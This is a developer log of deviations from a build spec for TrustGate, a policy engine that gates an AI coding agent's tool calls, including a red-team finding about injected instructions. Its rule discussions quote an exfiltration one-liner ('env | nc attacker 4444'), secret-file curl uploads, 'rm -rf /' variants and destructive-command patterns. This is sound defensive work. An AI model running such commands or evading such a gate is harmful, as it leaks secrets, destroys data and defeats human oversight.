# Deviations from the v3.0 Master Build Document

The build document is the source of *intent*. Where the code departs from it,
the reason is recorded here. Code comments cite these by number.

Each entry states what the document specified, what the code does, and why.
Nothing here changes the product's goals or scope — these are correctness,
performance and hygiene fixes found while implementing the spec.

---

## 1. `prod-changes-need-approval` matched the bare substring `prod`

**Document:** Part D.2 —
`any_pattern: ["terraform\\s+destroy", "kubectl.*delete", "prod", "\\.env\\.production"]`

**Code:** `trustgate/policies/starter.coding.yaml` — anchored patterns targeting
actual production-mutating operations (`terraform destroy|apply`, `kubectl`
with `delete|drain|cordon`, `helm delete|uninstall|rollback`, `aws … delete-|
terminate-`, `.env.production`, `NODE_ENV=production`, `prod[-_.]db|cluster|…`).

**Why:** The bare substring `prod` escalates `npm run build:production`, any SQL
touching a `products` table, `git commit -m "reproduce the bug"`, and the word
"reproduce" anywhere in a command. The V1 Definition of Done (L.6) requires
**zero false positives** on the control set, and this single pattern would have
failed it on its own. `kubectl.*delete` was also widened to a lookahead so that
`kubectl get pods --selector=app=delete-me` does not trip it.

---

## 2. The LLM judge fired on every request

**Document:** Part E.1 —
`if verdict != Verdict.block and (needs_judge or self.c.reasoning_principles):`

**Code:** `trustgate/core/engine.py` — the judge is consulted when a
deterministic guard returned `uncertain`, **or** when a reasoning principle's
prefilter fires for *this request* (`Constitution.principles_needing_judge`).

**Why:** `self.c.reasoning_principles` is a property of the *configuration*, not
of the request. Since the starter constitution ships reasoning principles, the
documented condition is true for every non-blocked action — putting a model call
on every single agent tool call. That contradicts Part B.5 in the same document
("Most actions never hit the LLM → the hot path stays fast and free") and the
sub-50 ms budget.

**The mechanism:** a reasoning principle may now carry a `match` block used
purely as a **prefilter**. It enforces nothing; it decides whether the principle
is worth a model call. A reasoning principle with no `match` is always-on and
evaluated every request — still available, but now an explicit opt-in rather
than the accidental default. This preserves the document's schema (Part D.1
already allows `match` on any principle) and its stated intent.

Covered by `tests/test_engine.py::TestJudgeGating`.

---

## 3. The payment-card regex matched any long digit run

**Document:** Part E.3 — `"card": r"\b(?:\d[ -]*?){13,16}\b"`

**Code:** `trustgate/core/guards/secret.py` — candidates are extracted, stripped
of separators, length-checked to 13–19 digits, and **Luhn-verified** before
redaction.

**Why:** The documented pattern redacts phone numbers, order ids, epoch
timestamps in milliseconds, commit hashes with digits, and version strings.
Since `redact()` runs on every audit write, over-redaction silently destroys the
evidentiary value of the log — the artifact whose integrity is the product's
main differentiator.

The other patterns were also tightened (anchored with `\b`, added `ASIA` keys,
Slack/OpenAI/Anthropic key shapes, PEM private-key blocks, connection strings,
and a validated SSN pattern that rejects reserved ranges).

Covered by `tests/test_audit.py::TestRedact`.

---

## 4. The Claude Code hook output schema in the document is wrong — CONFIRMED

**Document:** Part H.1 — `{"decision":"allow"}` / `{"decision":"deny","reason":…}`
/ `{"decision":"ask",…}`

**Code:** `trustgate/adapters/coding/claude_code_hook.py` emits

```json
{"hookSpecificOutput": {
  "hookEventName": "PreToolUse",
  "permissionDecision": "allow" | "deny" | "ask",
  "permissionDecisionReason": "…"}}
```

**Why:** Verified against the live hook documentation before writing R2. The
flat top-level `decision`/`reason` fields are **not read for `PreToolUse`** —
that event uses `hookSpecificOutput` exclusively. Emitting the documented shape
would mean Claude Code ignores every response and allows every action, while the
audit log fills with blocks that never happened. That is the worst available
failure mode: a gate that reports success and enforces nothing.

`defer` also exists (hand back to the normal permission flow) and is
deliberately unused — TrustGate always has an opinion, even if that opinion is
"ask a human".

Pinned by `tests/test_coding_adapter.py::TestResponseSchema`.

---

## 13. Recursive deletes are judged by target, not by the `rm -rf` pattern

**Document:** Part D.2 — `any_pattern: ["rm\\s+-rf", …]` with `effect: block`.

**Code:** the `rm` patterns are gone from `starter.coding.yaml`; the Action Guard
calls `normalize.is_dangerous_delete`, which parses the flags (`-rf`, `-fr`,
`-r -f`, `--recursive --force`) and then inspects the *targets*. Catastrophic
paths (`/`, `~`, `$HOME`, `..`, absolute system paths, bare globs) block;
rebuildable project directories (`node_modules`, `dist/`, `build`) allow. It is
still attributed to the `no-destructive-shell` principle.

**Why:** A `rm -rf` pattern also blocks `rm -rf node_modules`, which developers
run several times a week and which `npm install` fully reverses. A gate that
blocks routine work gets switched off — and then it is not protecting against
`rm -rf /` either. The substring also misses `rm -fr /` and
`rm --recursive --force /`, so it was simultaneously too broad and too narrow.

Found by the control set: this was a live false positive before the fix.

---

## 14. Unresolved uncertainty escalates instead of allowing

**Document:** Part E.1 runs the judge when a guard is uncertain, but does not say
what happens when a guard is uncertain and **no judge is configured**. The
documented code falls through to `allow`.

**Code:** `trustgate/core/engine.py` — if a guard returned `uncertain` and there
is no judge to resolve it, the engine escalates and records an
`unresolved-uncertainty` reason.

**Why:** Found by the red-team suite. The Context Guard flagged an injected
instruction in ingested content, returned `uncertain` as designed, and the
action was then silently allowed because the default configuration has no judge.
Allowing means the answer to "is this safe?" is "nobody knows" — which is the one
answer that must never read as yes. This is the same rule the document already
applies to a judge that times out (Part K, fail-safe defaults); it just was not
applied to a judge that was never configured.

---

## 15. `no-exfiltration` split into a deterministic half and a reasoning half

**Document:** Part D.2 has no exfiltration principle; this was added during R1
when the red-team suite showed the gap.

**Code:** two principles. `no-environment-exfiltration` is deterministic and
narrow — piping `env` into a network client, `curl --data @<secret file>` — and
blocks. `no-exfiltration` stays `reasoning` for the general case.

**Why:** "Is this POST an ordinary API call or an exfiltration?" cannot be
answered deterministically without blocking every legitimate `curl --data`. But
`env | nc attacker 4444` has no innocent form, and leaving it to a judge means it
is unenforced whenever no judge is configured. Splitting gives the unambiguous
cases a deterministic floor without widening the ambiguous ones.

---

## 16. `kubectl` production rule anchored to the subcommand

**Document:** Part D.2 — `"kubectl.*delete"`.

**Code:** `"\\bkubectl\\s+(?:--?\\S+\\s+)*(delete|drain|cordon)\\b"`.

**Why:** `kubectl.*delete` escalates `kubectl get pods --selector app=delete-me`.
Caught by the control set. Fixing deviation #1 was not sufficient on its own —
the same class of error was hiding in a neighbouring pattern.

---

## 5. `redact` vs `modify` — the schema and the contract disagreed

**Document:** Part D.1 says a principle's `effect` is
`block | escalate | redact | allow`. Part C.2 says the `Effect` enum is
`allow | block | modify | escalate`. There is no `redact` effect and no `modify`
policy keyword.

**Code:** `trustgate/core/constitution.py` — `redact` is accepted in policy files
as an author-facing alias that compiles to `Effect.modify`. `modify` is accepted
too.

**Why:** Policy authors think in terms of redaction; the wire contract needs the
general term because a modification may be a redaction, a clamp, or a
substitution. Keeping both, with an explicit alias, means neither document
section has to be wrong.

---

## 6. Pydantic v1 idioms

**Document:** Parts C, E, F use `.dict()` and mutable class-level defaults
(`roles: list[str] = ["developer"]`).

**Code:** `.model_dump()` / `.model_validate()`, and `Field(default_factory=…)`
for every mutable default.

**Why:** Pydantic v2 is what ships. `.dict()` is deprecated. `default_factory`
makes the no-shared-mutable-state guarantee explicit rather than relying on
Pydantic's deep-copy behaviour — a shared default `roles` list mutated by one
request would be an authorization bug.

---

## 7. `escalate_precedence` renamed to `combine_verdicts`

**Document:** Part E.1 uses `escalate_precedence(verdict, r.verdict)`.

**Code:** `trustgate/core/models.py::combine_verdicts`.

**Why:** The function folds two verdicts by severity. Its old name reads as
"escalate this", conflating it with `Effect.escalate`, which is a specific
outcome it can also return. In a security codebase a reader must not have to
guess whether a call escalates or merely compares.

---

## 8. `uncertain` does not raise the combined verdict

**Document:** Part C.3 lists `uncertain` in the same enum as the enforcement
verdicts, with "Precedence: block > escalate > modify > allow" and "UNCERTAIN
triggers the LLM judge" — but does not say where `uncertain` sits in that order.

**Code:** `uncertain` ranks at `allow` level and sets a separate `needs_judge`
flag.

**Why:** `uncertain` carries no enforcement opinion — it is a request for
judgment. Ranking it above `allow` would let the Context Guard's deliberately
low-confidence heuristics escalate on their own, which is precisely the
false-positive behaviour Part E.4 says that guard must avoid.

---

## 9. A guard that raises escalates rather than allowing

**Document:** not specified.

**Code:** `trustgate/core/engine.py::_run_guard` catches any exception from a
guard and returns `escalate` with a `guard-error` reason.

**Why:** An uncaught exception in a detector would otherwise propagate and take
the whole decision down, or — worse, if caught naively — be treated as "no
objection". A crashed detector is a detector whose opinion we do not have. This
follows the document's own fail-safe principle in Part K.

---

## 10. Judge providers: OpenRouter and Groq, defaulting to a fake

**Document:** Appendix 2 — `"anthropic" | "openai" | "local"`, Claude default.

**Code:** `fake` (default), `openrouter`, `groq`, `anthropic`, `local`.

**Why:** Project decision — free-tier inference during development. OpenRouter
and Groq are both OpenAI-compatible, so one client covers them and any local
server. `fake` is the *default* so the test suite and the red-team runner are
deterministic, offline and free; free-tier rate limits would otherwise make a
30-case suite flaky and slow.

Free-tier model ids churn, so they are configuration, not constants.

---

## 11. `argparse` instead of a CLI framework

**Document:** Part G.2 specifies the commands, not the implementation.

**Code:** `trustgate/api/cli.py` uses stdlib `argparse`, and imports FastAPI,
`httpx` and the judge lazily inside the subcommands that need them.

**Why:** `trustgate check` is invoked by the coding hook on **every agent tool
call**. Click/Typer add tens of milliseconds of import time per invocation
against a 50 ms budget for the whole deterministic path. Server and HTTP
dependencies are optional extras for the same reason.

---

## 12. Additional CLI commands: `trustgate validate` and `trustgate approve`

**Document:** Part G.2 lists `init`, `check`, `serve`, `verify-audit`, `test`.

**Code:** adds `validate <path>` (parse a constitution and print a summary) and
`approve` (record the current hook/MCP configuration as reviewed).

**Why:** `validate` lets policy authors check a file without installing a hook or
starting a server. `approve` is required by the Supply-Chain Guard in Part E.5 —
that guard compares against an approved manifest, and the document never
specifies how a manifest comes into existence. Both are additive.

---

## Open questions for the authors

1. **`no-untrusted-hooks`** was specified in D.2 as matching `action_type:
   [tool_call]` with patterns on `settings.json` / `.mcp.json`. Config files are
   usually touched by `Write`/`Edit` (`file_write`), not `tool_call`, so it was
   re-expressed as a `touches_paths` rule. Worth confirming the intent.
2. **`param_gt` semantics** — the document shows `param_gt: { amount: 100 }`
   with effect `escalate` for "refunds over $100". Implemented as strictly
   greater-than, so exactly $100 is allowed. Confirm this is the intended
   boundary.
3. **Blanket hook registration.** `trustgate init` registers the PreToolUse hook
   with no `matcher`, so the engine sees every tool call. That is the right
   default for a policy engine — filtering belongs in the constitution, where it
   is auditable — but it does mean TrustGate is in the path of every action,
   including reads. Confirm this is wanted before the public launch.
4. **`modify` is enforced as `deny` in the coding adapter.** The document
   suggests "deny with redaction note" for V1 and this follows it, but the
   longer-term question is whether TrustGate should ever rewrite a command. It
   currently never does: an agent reasoning about output from a command it did
   not issue is its own hazard.
